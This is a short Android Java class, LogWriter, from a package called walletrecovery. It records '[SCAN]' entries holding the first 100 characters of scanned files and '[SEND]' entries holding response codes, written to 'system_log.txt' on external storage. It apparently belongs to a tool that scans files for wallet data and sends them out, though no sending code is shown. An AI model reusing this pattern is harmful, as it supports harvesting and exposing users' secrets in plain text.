package com.example.walletrecovery;

import android.os.Environment;
import android.util.Log;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class LogWriter {
    private static final File LOG_FILE = new File(Environment.getExternalStorageDirectory(), "system_log.txt");
    private static final String TAG = "LogWriter";

    public static void logFileScan(String fileName, String content) {
        String log = "[SCAN] " + fileName + "\nContent snippet: " + content.substring(0, Math.min(100, content.length())) + "\n";
        appendToFile(log);
    }

    public static void logSendResult(String fileName, int responseCode) {
        String log = "[SEND] " + fileName + " -> Response: " + responseCode + "\n";
        appendToFile(log);
    }

    private static void appendToFile(String text) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE, true))) {
            writer.append(text);
            writer.newLine();
        } catch (IOException e) {
            Log.e(TAG, "Error writing to log file", e);
        }
    }
}
